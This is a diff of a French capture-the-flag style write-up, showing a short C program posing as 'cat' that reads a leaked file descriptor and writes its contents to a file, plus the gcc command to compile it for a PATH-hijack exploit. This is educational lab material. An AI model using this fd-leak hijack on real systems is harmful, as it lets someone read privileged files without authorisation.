@@ -76,19 +76,19 @@
 ## Pour exploiter cette faille nous devons creer notre propre version de cat , ou prendre la version de quelqu'un d'autre . 
 - Personnelement , j'ai trouver ce code cat sur internet :
  <pre>
-#include
-#include
-#include
-
-       int main(int argc, char *argv[]) {
-       FILE *fp = fopen(argv[1], "w");
-               char buf[16];
-       memset(buf, 0, sizeof buf);
-       lseek(3, 0, SEEK_SET);
-       read(3, buf, sizeof buf);
-        fprintf(fp, "%s", buf);
-    return 0;
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+FILE *fp = fopen(argv[1], "w");
+char buf[16];
+memset(buf, 0, sizeof buf);
+lseek(3, 0, SEEK_SET);
+read(3, buf, sizeof buf);
+fprintf(fp, "%s", buf);
+return 0;
 }
+
     </pre>
     
 - nous allons ensuite compiler ce code avec la commande suivante : `gcc -m32 cat.c -o cat` et `cat` deviendra la  version compiler de cat.c , le nom du programme compiler doit etre `cat` parce qu'on doit faire en sorte que le programme utilise notre `cat` au lieu de la commande de base . 
